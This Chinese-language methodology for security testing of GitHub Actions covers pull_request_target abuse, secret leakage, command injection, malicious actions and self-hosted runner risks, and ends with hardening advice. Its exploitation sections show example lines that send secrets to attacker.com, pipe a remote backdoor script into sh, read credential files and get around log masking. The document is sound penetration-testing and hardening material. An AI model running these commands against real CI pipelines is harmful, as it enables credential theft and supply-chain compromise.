# GitHub Actions 安全测试方法论

---

# 第一部分：文档概述

## 1.1 编写目的
- 为渗透测试人员提供 GitHub Actions 安全测试的系统化方法
- 指导测试人员识别 GitHub Actions 工作流中的安全漏洞
- 帮助理解 CI/CD 自动化中的攻击面和防御措施

## 1.2 适用范围
- 适用于使用 GitHub Actions 进行 CI/CD 的项目
- 适用于开源项目和企业私有仓库
- 适用于使用 GitHub Actions 进行自动化构建、测试、部署的场景

## 1.3 读者对象
- 渗透测试工程师
- GitHub 安全管理员
- DevSecOps 工程师
- 开源项目维护者

---

# 第二部分：核心渗透技术专题

## 专题一：GitHub Actions 安全测试

### 2.1 技术介绍

GitHub Actions 安全测试是指对 GitHub Actions 工作流配置、权限设置、Secrets 管理、第三方 Actions 使用等进行系统性安全评估，识别可能导致代码泄露、凭证窃取、恶意代码执行的安全弱点。

**GitHub Actions 架构：**

```
┌─────────────────────────────────────────────────────────────┐
│                      GitHub Actions 架构                     │
├─────────────────────────────────────────────────────────────┤
│  Trigger (触发器)                                           │
│  ├── push / pull_request / schedule / workflow_dispatch    │
│  └── 事件触发工作流执行                                      │
├─────────────────────────────────────────────────────────────┤
│  Runner (运行器)                                            │
│  ├── GitHub-hosted (ubuntu-latest 等)                      │
│  └── Self-hosted (自托管运行器)                             │
├─────────────────────────────────────────────────────────────┤
│  Workflow (工作流)                                          │
│  ├── Jobs (多个并行或串行任务)                              │
│  └── Steps (具体执行步骤)                                   │
├─────────────────────────────────────────────────────────────┤
│  Actions (动作)                                             │
│  ├── Official Actions (actions/*)                          │
│  └── Third-party Actions (用户/组织/*)                      │
└─────────────────────────────────────────────────────────────┘
```

**常见安全问题：**

| 问题类型 | 描述 | 危害等级 |
|---------|------|---------|
| pull_request_target 滥用 | 在目标仓库上下文执行 PR 代码 | 严重 |
| Secrets 泄露 | Secrets 输出到日志或被窃取 | 严重 |
| 不安全的 Actions 使用 | 使用未锁定或恶意 Actions | 高 |
| Runner 逃逸 | 自托管 Runner 被入侵 | 高 |
| 命令注入 | 用户输入直接用于 run 命令 | 高 |
| 过度权限 | GITHUB_TOKEN 权限过大 | 中 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 开源项目 CI | 接受外部 PR | PR 可能包含恶意代码 |
| 自动化发布 | 自动发布到 npm/PyPI | 发布凭证可能被窃取 |
| 自动部署 | 自动部署到云环境 | 云凭证可能泄露 |
| 依赖更新 | Dependabot 自动 PR | 依赖更新可能触发漏洞 |
| 跨仓库工作流 | 复用其他仓库工作流 | 可能引入不信任代码 |
| 自托管 Runner | 使用自建 Runner | Runner 可能被入侵 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：识别工作流配置**
```bash
# 检查公开的工作流文件
curl https://github.com/user/repo/tree/main/.github/workflows

# 下载工作流文件
curl -L https://raw.githubusercontent.com/user/repo/main/.github/workflows/ci.yml

# 检查工作流运行历史
# https://github.com/user/repo/actions
# 可能看到失败的作业和错误信息
```

**步骤二：分析工作流权限**
```yaml
# 检查 permissions 设置
# 如果未设置，默认使用仓库写入权限

# 检查 GITHUB_TOKEN 使用
# 是否有写仓库、发 Release、评论等权限
```

**步骤三：检查 Secrets 使用**
```yaml
# 检查 Secrets 如何被使用
# env:
#   API_KEY: ${{ secrets.API_KEY }}

# 检查是否有泄露风险
# - run: echo ${{ secrets.API_KEY }}  # 危险！
```

#### 2.3.2 白盒测试

**步骤一：审计工作流文件**
```yaml
# 检查 .github/workflows/*.yml

# 高风险模式检查：
# 1. pull_request_target 触发器
on:
  pull_request_target:
    types: [opened, synchronize]

# 2. 用户输入直接用于 run
- run: npm install ${{ github.event.pull_request.title }}

# 3. 未锁定的 Actions
- uses: some-user/some-action@v1  # 应使用具体 hash

# 4. Secrets 输出到日志
- run: echo "Token: ${{ secrets.TOKEN }}"
```

**步骤二：检查 Runner 配置**
```bash
# 检查是否使用自托管 Runner
# runs-on: [self-hosted]

# 自托管 Runner 风险：
# - 可能被入侵
# - 可能持久化恶意代码
# - 可能访问内网资源
```

**步骤三：检查第三方 Actions**
```bash
# 1. 列出所有使用的第三方 Actions
grep "uses:" .github/workflows/*.yml

# 2. 检查 Actions 来源和信誉
# - 查看作者信息
# - 检查 star 数量和下载量
# - 审查 Actions 代码

# 3. 检查是否锁定版本
# 推荐使用 commit hash
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
```

### 2.4 漏洞利用方法

#### 2.4.1 pull_request_target 攻击

```yaml
# 危险配置示例
name: CI
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install  # 执行 PR 中的代码！

# 攻击流程：
# 1. 创建恶意 PR，修改 package.json
# 2. 在 preinstall 脚本中添加恶意代码
# 3. 工作流在目标仓库上下文执行
# 4. Secrets 被窃取
```

#### 2.4.2 Secrets 窃取

```yaml
# 方法 1: 通过日志输出
- name: Leak Secrets
  run: |
    echo "AWS_KEY=${{ secrets.AWS_ACCESS_KEY_ID }}"
    echo "AWS_SECRET=${{ secrets.AWS_SECRET_ACCESS_KEY }}"

# 方法 2: 通过外部请求
- name: Exfiltrate
  run: |
    curl "https://attacker.com/exfil?key=${{ secrets.API_KEY }}"

# 方法 3: 通过 PR 评论
- name: Comment
  uses: actions/github-script@v6
  with:
    script: |
      github.rest.issues.createComment({
        body: process.env.SECRET_TOKEN  // 泄露
      })
```

#### 2.4.3 命令注入

```yaml
# 危险配置
- name: Process Input
  run: |
    echo "Processing: ${{ github.event.issue.title }}"
    # 如果标题包含特殊字符，可能注入命令

# 利用示例
# Issue 标题：test; cat /etc/passwd #
# 执行结果：echo "Processing: test"; cat /etc/passwd #
```

#### 2.4.4 恶意 Actions 利用

```yaml
# 1. 发现目标使用第三方 Actions
- uses: vulnerable-action@v1.0

# 2. 如果该 Actions 存在漏洞或被入侵
# 可以执行任意代码

# 3. 或者创建钓鱼 Actions
# 名称相似：actions/checkout vs actionss/checkout

# 4. 诱导目标使用
- uses: actionss/checkout@v1  # 恶意 Actions
```

#### 2.4.5 Runner 入侵

```bash
# 针对自托管 Runner 的攻击

# 1. 如果 Runner 在内网
# 可以访问内网资源

# 2. 在 Runner 上持久化
- run: |
    echo "malicious code" >> ~/.bashrc
    curl http://attacker.com/backdoor.sh | sh

# 3. 窃取 Runner 凭证
- run: |
    cat ~/.git-credentials
    cat ~/.aws/credentials
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过分支保护

```yaml
# 1. 利用未启用保护规则的分支
# 直接推送恶意工作流

# 2. 利用 Fork 仓库
# Fork 后修改工作流，然后 PR

# 3. 利用管理员权限
# 如果获取了 admin 权限
```

#### 2.5.2 绕过 Secrets 保护

```yaml
# 1. Secrets 有日志脱敏
# 但可以通过编码绕过

- run: |
    echo ${{ secrets.TOKEN }} | base64
    # 或者分块输出
    echo ${{ secrets.TOKEN }} | cut -c1-10
    echo ${{ secrets.TOKEN }} | cut -c11-20
```

#### 2.5.3 绕过权限检查

```yaml
# 1. 利用默认权限
# 如果未设置 permissions，使用默认权限

# 2. 利用其他作业
# 一个作业获取权限，传递给另一个

# 3. 利用外部服务
# 通过外部服务中转
```

---

# 第三部分：附录

## 3.1 GitHub Actions 安全配置检查表

| 检查项 | 推荐配置 | 风险等级 |
|-------|---------|---------|
| 触发器类型 | 避免 pull_request_target | 严重 |
| Actions 版本 | 使用 commit hash 锁定 | 高 |
| permissions | 最小权限原则 | 高 |
| Secrets 使用 | 不输出到日志 | 严重 |
| 用户输入 | 不直接用于 run | 高 |
| Runner 类型 | 优先 GitHub-hosted | 中 |
| 第三方 Actions | 审查来源和代码 | 中 |

## 3.2 安全工作流配置示例

```yaml
name: Secure CI
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      
      - name: Setup Node
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install Dependencies
        run: npm ci  # 使用 ci 而非 install
      
      - name: Test
        run: npm test
      
      # 不直接使用用户输入
      # 不输出 Secrets 到日志
```

## 3.3 常见 Secrets 泄露模式

| 模式 | 正则表达式 | 示例 |
|-----|-----------|------|
| GitHub Token | `ghp_[a-zA-Z0-9]{36}` | ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx |
| AWS Access Key | `AKIA[0-9A-Z]{16}` | AKIAIOSFODNN7EXAMPLE |
| AWS Secret Key | `[0-9a-zA-Z/+]{40}` | wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY |
| npm Token | `npm_[a-zA-Z0-9]{36}` | npm_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx |
| Slack Token | `xox[baprs]-[0-9a-zA-Z]{10,48}` | xoxb-xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx |

## 3.4 安全工具

| 工具名称 | 用途 | 链接 |
|---------|------|------|
| zizmor | GitHub Actions 审计 | https://github.com/woodruffw/zizmor |
| actionlint | 工作流语法检查 | https://github.com/rhysd/actionlint |
| step-security | Actions 安全加固 | https://github.com/step-security/secure-repo |
| Gato | GitHub Actions 测试 | https://github.com/praetorian-inc/gato |

---

## 参考资源

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Keeping your GitHub Actions and workflows secure](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [OWASP GitHub Actions Security](https://owasp.org/www-project-devsecops-guideline/)
- [Step Security GitHub Actions Security](https://www.stepsecurity.io/github-actions-security)
